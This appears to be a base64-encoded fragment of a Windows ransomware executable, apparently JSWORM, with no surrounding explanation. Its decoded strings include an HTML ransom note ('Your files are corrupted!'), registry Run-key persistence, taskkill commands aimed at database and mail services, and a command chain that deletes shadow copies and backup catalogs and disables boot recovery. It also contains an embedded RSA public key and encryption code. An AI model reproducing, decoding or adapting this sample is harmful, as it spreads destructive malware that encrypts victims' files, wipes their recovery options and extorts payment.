RlcmF0b3InAABgdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAGBkeW5hbWljIGF0ZXhpdCBkZXN0cnVjdG9yIGZvciAnAAAAAGBkeW5hbWljIGluaXRpYWxpemVyIGZvciAnAABgZWggdmVjdG9yIHZiYXNlIGNvcHkgY29uc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgY29weSBjb25zdHJ1Y3RvciBpdGVyYXRvcicAAABgbWFuYWdlZCB2ZWN0b3IgZGVzdHJ1Y3RvciBpdGVyYXRvcicAAAAAYG1hbmFnZWQgdmVjdG9yIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwAAAGBwbGFjZW1lbnQgZGVsZXRlW10gY2xvc3VyZScAAAAAYHBsYWNlbWVudCBkZWxldGUgY2xvc3VyZScAAGBvbW5pIGNhbGxzaWcnAAAgZGVsZXRlW10AAAAgbmV3W10AAGBsb2NhbCB2ZnRhYmxlIGNvbnN0cnVjdG9yIGNsb3N1cmUnAGBsb2NhbCB2ZnRhYmxlJwBgUlRUSQAAAGBFSABgdWR0IHJldHVybmluZycAYGNvcHkgY29uc3RydWN0b3IgY2xvc3VyZScAAGBlaCB2ZWN0b3IgdmJhc2UgY29uc3RydWN0b3IgaXRlcmF0b3InAABgZWggdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAGBlaCB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2aXJ0dWFsIGRpc3BsYWNlbWVudCBtYXAnAABgdmVjdG9yIHZiYXNlIGNvbnN0cnVjdG9yIGl0ZXJhdG9yJwBgdmVjdG9yIGRlc3RydWN0b3IgaXRlcmF0b3InAAAAAGB2ZWN0b3IgY29uc3RydWN0b3IgaXRlcmF0b3InAAAAYHNjYWxhciBkZWxldGluZyBkZXN0cnVjdG9yJwAAAABgZGVmYXVsdCBjb25zdHJ1Y3RvciBjbG9zdXJlJwAAAGB2ZWN0b3IgZGVsZXRpbmcgZGVzdHJ1Y3RvcicAAAAAYHZiYXNlIGRlc3RydWN0b3InAABgc3RyaW5nJwAAAABgbG9jYWwgc3RhdGljIGd1YXJkJwAAAABgdHlwZW9mJwAAAABgdmNhbGwnAGB2YnRhYmxlJwAAAGB2ZnRhYmxlJwAAAF49AAB8PQAAJj0AADw8PQA+Pj0AJT0AAC89AAAtPQAAKz0AACo9AAB8fAAAJiYAAHwAAABeAAAAfgAAACgpAAAsAAAAPj0AAD4AAAA8PQAAPAAAACUAAAAvAAAALT4qACYAAAArAAAALQAAAC0tAAArKwAAKgAAAC0+AABvcGVyYXRvcgAAAABbXQAAIT0AAD09AAAhAAAAPDwAAD4+AAA9AAAAIGRlbGV0ZQAgbmV3AAAAAF9fdW5hbGlnbmVkAF9fcmVzdHJpY3QAAF9fcHRyNjQAX19lYWJpAABfX2NscmNhbGwAAABfX2Zhc3RjYWxsAABfX3RoaXNjYWxsAABfX3N0ZGNhbGwAAABfX3Bhc2NhbAAAAABfX2NkZWNsAF9fYmFzZWQoAAAAAAAAAABwM0AAaDNAAFwzQABQM0AARDNAADgzQAAsM0AAJDNAABwzQAAQM0AABDNAAEtCQAD8MkAA9DJAAPAyQADsMkAA6DJAAOQyQADgMkAA3DJAANgyQADMMkAAyDJAAMQyQADAMkAAvDJAALgyQAC0MkAAsDJAAKwyQACoMkAApDJAAKAyQACcMkAAmDJAAJQyQACQMkAAjDJAAIgyQACEMkAAgDJAAHwyQAB4MkAAdDJAAHAyQABsMkAAaDJAAGQyQABgMkAAXDJAAFgyQABUMkAAUDJAAEQyQAA4MkAAMDJAACQyQAAMMkAAADJAAOwxQADMMUAArDFAAIwxQABsMUAATDFAACgxQAAMMUAA6DBAAMgwQACgMEAAhDBAAHQwQABwMEAAaDBAAFgwQAA0MEAALDBAACAwQAAQMEAA9C9AANQvQACsL0AAhC9AAFwvQAAwL0AAFC9AAPAuQADMLkAAoC5AAHQuQABYLkAAS0JAAEQuQAAoLkAAFC5AAPQtQADYLUAAR2V0UHJvY2Vzc1dpbmRvd1N0YXRpb24AR2V0VXNlck9iamVjdEluZm9ybWF0aW9uVwAAAEdldExhc3RBY3RpdmVQb3B1cAAAR2V0QWN0aXZlV2luZG93AE1lc3NhZ2VCb3hXAFUAUwBFAFIAMwAyAC4ARABMAEwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgACAAIAAgACAAIAAgACAAIAAoACgAKAAoACgAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAASAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEACEAIQAhACEAIQAhACEAIQAhACEABAAEAAQABAAEAAQABAAgQCBAIEAgQCBAIEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABABAAEAAQABAAEAAQAIIAggCCAIIAggCCAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAQABAAEAAQACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAgACAAIAAgACAAIAAgACAAaAAoACgAKAAoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEgAEAAQABAAEAAQABAAEAAQABAAEAAQABAAEAAQABAAhACEAIQAhACEAIQAhACEAIQAhAAQABAAEAAQABAAEAAQAIEBgQGBAYEBgQGBAQEBAQEBAQEBAQEBAQEBAQEBAQ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V0ID0pADAxMjM0NTY3ODlBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6AAAwMTIzNDU2Nzg5QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVoAAAAAIgAAAC1ERUNSWVBULmh0YQAAAABcAAAAIC9jIHJlZyBhZGQgSEtMTVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3YgInphcGlza2EiIC9kICIAAAAAY21kLmV4ZQAAAAAAIC9jIHJlZyBhZGQgSEtDVVxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4gL3YgInphcGlza2EiIC9kICIAAAAAIC9jIHRhc2traWxsLmV4ZSB0YXNra2lsbCAvZiAvaW0gc3RvcmUuZXhlAAAgL2MgdGFza2tpbGwuZXhlIHRhc2traWxsIC9mIC9pbSBzcWxzZXJ2ZXIuZXhlAAAgL2MgdGFza2tpbGwuZXhlIHRhc2traWxsIC9mIC9pbSBkbnMuZXhlAAAAACAvYyB0YXNra2lsbC5leGUgdGFza2tpbGwgL2YgL2ltIHNxbHdyaXRlci5leGUAAGludmFsaWQgc3RyaW5nIHBvc2l0aW9uAHN0cmluZyB0b28gbG9uZwBmdWNrYXYAAE1pY3Jvc29mdCBFbmhhbmNlZCBDcnlwdG9ncmFwaGljIFByb3ZpZGVyIHYxLjAAAAoAAAAtAEQARQBDAFIAWQBQAFQALgBoAHQAYQAAAAAALS0+ADwvc3Bhbj48L3A+PC9kaXY+PGRpdiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgdHJhbnNwYXJlbnQ7IHdpZHRoOiA1MCU7IGhlaWdodDogMTUwcHg7IGJhY2tncm91bmQtY29sb3I6IzllZDBmZjsgbWFyZ2luLWxlZnQ6MTVweDsgYm9yZGVyLWxlZnQtY29sb3I6ICMzZWEwZmQ7IGJvcmRlci1sZWZ0LXN0eWxlOiBzb2xpZDsgYm9yZGVyLWxlZnQtd2lkdGg6IDhweDsgcGFkZGluZy1sZWZ0OiAxMHB4OyI+PGgzIHN0eWxlPSJwYWRkaW5nLWxlZnQ6IDE1cHg7IHBhZGRpbmctdG9wOiA1cHg7Ij5GcmVlIGRlY3J5cHRpb24gYXMgZ3VhcmFudGVlITwvaDM+PHAgc3R5bGU9InBhZGRpbmctbGVmdDogMzBweDsiPkJlZm9yZSBwYXlpbmcgeW91IGNhbiByZXF1ZXN0IGZyZWUgZGVjcnlwdGlvbiBvZiAzIGZpbGVzLjwvcD48cCBzdHlsZT0icGFkZGluZy1sZWZ0OiAzMHB4OyI+VG90YWwgc2l6ZSBvZiBmaWxlcyBtdXN0IGJlIGxlc3MgdGhhbiA1TUIgKG5vbi1hcmNoaXZlZCkuPC9wPjxwIHN0eWxlPSJwYWRkaW5nLWxlZnQ6IDMwcHg7Ij5GaWxlcyBzaG91bGRuJ3QgY29udGFpbiB2YWx1YWJsZSBpbmZvcm1hdGlvbiAoYWNjZXB0IG9ubHkgdHh0XGpwZ1xwbmcpLjwvcD48L2Rpdj48cD48L3A+PGRpdiBzdHlsZT0iYm9yZGVyOiAxcHggc29saWQgdHJhbnNwYXJlbnQ7IHdpZHRoOiA1MCU7IGhlaWdodDogMTUwcHg7IGJhY2tncm91bmQtY29sb3I6IzllZDBmZjsgbWFyZ2luLWxlZnQ6MTVweDsgYm9yZGVyLWxlZnQtY29sb3I6IHJlZDsgYm9yZGVyLWxlZnQtc3R5bGU6IHNvbGlkOyBib3JkZXItbGVmdC13aWR0aDogOHB4OyBwYWRkaW5nLWxlZnQ6IDEwcHg7Ij48aDMgc3R5bGU9InBhZGRpbmctbGVmdDogMTVweDsgcGFkZGluZy10b3A6IDVweDsiPkF0dGVudGlvbiE8L2gzPjxwIHN0eWxlPSJwYWRkaW5nLWxlZnQ6IDMwcHg7Ij5Eb24ndCB0cnkgdG8gZGVjcnlwdCBpdCBtYW51YWxseS48L3A+PHAgc3R5bGU9InBhZGRpbmctbGVmdDogMzBweDsiPkRvbid0IHJlbmFtZSBleHRlbnNpb24gb2YgZmlsZXMuPC9wPjxwIHN0eWxlPSJwYWRkaW5nLWxlZnQ6IDMwcHg7Ij5Eb24ndCB0cnkgdG8gd3JpdGUgQVYgY29tcGFuaWVzICh0aGV5IGNhbid0IGhlbHAgeW91KS48L3A+PC9kaXY+PC9kaXY+PC9ib2R5PjwvaHRtbD4KPCEtLQoAAAAAADwvc3Bhbj48L3A+PHAgc3R5bGU9ImZvbnQtd2VpZ2h0OmJvbGQ7Ij5CYWNrdXAgZS1tYWlsIGZvciBjb250YWN0IDogPHNwYW4gc3R5bGU9ImJhY2tncm91bmQtY29sb3I6IzAwZmY5MCI+AAAAAAA8L3NwYW4+PC9wPjxwIHN0eWxlPSJmb250LXdlaWdodDpib2xkOyI+RS1tYWlsIGZvciBjb250YWN0OiA8c3BhbiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojMDBmZjkwIj4AAAAAACIgU0NST0xMPSJubyIgU0lOR0xFSU5TVEFOQ0U9InllcyIgU3lzTWVudT0ibm8iIFNIT1dJTlRBU0tCQVI9Im5vIiBXSU5ET1dTVEFURT0ibm9ybWFsIiBCT1JERVI9InRoaW4iIEJPUkRFUlNUWUxFPSJzdW5rZW4iLz48L2hlYWQ+PGJvZHkgc3R5bGU9ImJhY2tncm91bmQtY29sb3I6ICNkNWRlZWY7Ij48ZGl2IHN0eWxlPSJ3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyBib3JkZXI6IDJweCBzb2xpZCAjZTZlY2QyOyBiYWNrZ3JvdW5kLWNvbG9yOiAjZTZlY2Y3OyI+PGRpdiBzdHlsZT0icGFkZGluZy1sZWZ0OjE1cHg7Ij48aDEgc3R5bGU9ImZvbnQtd2VpZ2h0OmJvbGQ7IHRleHQtYWxpZ246IGNlbnRlcjsiPllvdXIgZmlsZXMgYXJlIGNvcnJ1cHRlZCE8L2gxPjxwIHN0eWxlPSJmb250LXdlaWdodDpib2xkOyI+SWRlbnRpZmljYXRvciBmb3IgZmlsZXM6IDxzcGFuIHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOiMwMGZmOTAiPgA8L3RpdGxlPjxIVEE6QVBQTElDQVRJT04gQVBQTElDQVRJT05OQU1FPSIAADxodG1sPjxoZWFkPjx0aXRsZT5KU1dPUk0gAABdAC4AAAAAAF0AWwAAAAAALgBbAEkARAAtAAAAKgAuACoAAAAuAAAALgAuAAAAAAAuAC4ALgAAAHcAaQBuAGQAbwB3AHMAAAAkAFIARQBDAFkAQwBMAEUALgBCAEkATgAAAAAAcgBzAGEAAABOAFQARABFAFQARQBDAFQALgBDAE8ATQAAAAAAbgB0AGwAZAByAAAATQBTAEQATwBTAC4AUwBZAFMAAABJAE8ALgBTAFkAUwAAAAAAYgBvAG8AdAAuAGkAbgBpAAAAAABBAFUAVABPAEUAWABFAEMALgBCAEEAVAAAAAAAbgB0AHUAcwBlAHIALgBkAGEAdAAAAAAAZABlAHMAawB0AG8AcAAuAGkAbgBpAAAAQwBPAE4ARgBJAEcALgBTAFkAUwAAAAAAUgBFAEMAWQBDAEwARQBSAAAAAABCAE8ATwBUAFMARQBDAFQALgBCAEEASwAAAAAAYgBvAG8AdABtAGcAcgAAACMAMQBlAFMAYwBhAG4AUAByAG8AdABlAGMAdABlAGQALgBkAG8AYwB4AAAAIwAwAGUAUwBjAGEAbgBQAHIAbwB0AGUAYwB0AGUAZAAuAGQAbwBjAHgAAABKU1dPUk0AAGV4ZQBFWEUAbG9nAExPRwBNU0lMT0cAAG1zaWxvZwAAZGxsAERMTABjYWIAQ0FCAERFQ1JZUFQuaHRhADoAXAAAAAAAIC9jIHBpbmcgbG9jYWxob3N0IC1uIDMgPiBudWwgJiBkZWwgIgAAAC1ERUNSWVBULmh0YSIAAAAgL2MgIgAAAAAAAAAgL2MgdnNzYWRtaW4uZXhlIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0ICYgYmNkZWRpdCAvc2V0IHtkZWZhdWx0fSBib290c3RhdHVzcG9saWN5IGlnbm9yZWFsbGZhaWx1cmVzICYgYmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgbm8gJiB3YmFkbWluIGRlbGV0ZSBjYXRhbG9nIC1xdWlldCAmIHdtaWMgc2hhZG93Y29weSBkZWxldGUAAAAAQmdJQUFBQ2tBQUJTVTBFeEFCQUFBQUVBQVFCZFZWOXhYVXcyb0FNNUREY3VBZXdOdk9mVy93cWV5YkRDalBGR0M2aEhvRk40c0ZWTkZkOWxCWmRsWFJnYUdXZDB2ZmVPUG5HNTBoc3dSYk5oK0VWWEVDVlFsL2VjVUFRa3ZZWklyUVlRbnZRczNOSXZMSTN1R3hmMEpldzdGYk02bnZKVXZIMUlwdEVzN2thUi9PQlhmdzJVZkR0Si9rU1VINE9MYndNMU1xMmE3YlBrZGt1YUY3OUpnZ0dJSm5aTkg5Q0dBSTJrR0F2OHA1R0YvQ3dXSlB4ZE5ydVRkdHNDNEp2a3diZzhjR1lTUGlrTE5ZYUxGeFZzNWRUTm9ieURNSVZ5SXhPT1FacDhtQ3pFRUxpaWQxdXlpSU1mbWxvRmY4QkhUaHVpU1VFdW1xV1hvRmxydDUzTDJUa0pERzJuMnBua2JybENNUFRuYnFCaW1ZbUR5MHU1Z1hwTHRQYjdKdllwRURWYncrTG5zM2ViOWNjK3JNMU1LazhsWWtvZDl1eTVLa0c3WEVkQ05EUVJxUUNSeUFvdzRhQVoxUGcyQnMzZXRwMzZ4U0xGVjYxQ2w2eVdQRGRMWWJIQ2dqZHRxQ3NXeU9PY1NSV3NiUWdCVWQwTHEvM1hYQjVhbUJCQ05mdnRWZDZEYUd5QVQ2QkZORUtNNEZ3Vk1jZW9leDRES0s0L0F3Kzd3YVN0VHhDeS85QVlKVi82REdSdy9id3JJdmc1OFZicjdPck42bEo0UUVFQ1NJa0lHcHc4WWdPTlFPQktra29oaWQxcVJwZGd2Q29rVEZrOEszNU1vMm1PbnFjVEE4QnFvY2VTTnlaMmxTNER0akNPNXV0OStNdFBYU2JOa2FwK1RTaTQyb1ZoRGlWUzVLbUZMb2REQlhsVkFacFNrTGVENlE9PQAAAABKAFMAVwBSAE0AAAA0LjAuMwAAAEtZZTQ2Z0tJSkIwbTB4S1NyUXc9AAAAAEtZRzk1QU9NRHo0cTN4clg3d2t0AAAAAPP3QACAUkAA/fVAAB2kQABiYWQgZXhjZXB0aW9uAAAASAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPBJAANBSQAAXAAAAAAAAAAAAAAAAAAAAwBFAAMxQQAAAAAAAAAAAAAIAAADcUEAA6FBAADBSQAAAAAAAwBFAAAEAAAAAAAAA/////wAAAABAAAAAzFBAAAAAAAAAAAAAAAAAAOARQAAYUUAAAAAAAAAAAAADAAAAKFFAADhRQADoUEAAMFJAAAAAAADgEUAAAgAAAAAAAAD/////AAAAAEAAAAAYUUAAAAAAAAAAAAAAAAAAABJAAGhRQAAAAAAAAAAAAAMAAAB4UUAAiFFAAOhQQAAwUkAAAAAAAAASQAACAAAAAAAAAP////8AAAAAQAAAAGhRQAAAAAAAAAAAAAAAAACAHUAATFJAAAAAAAAAAA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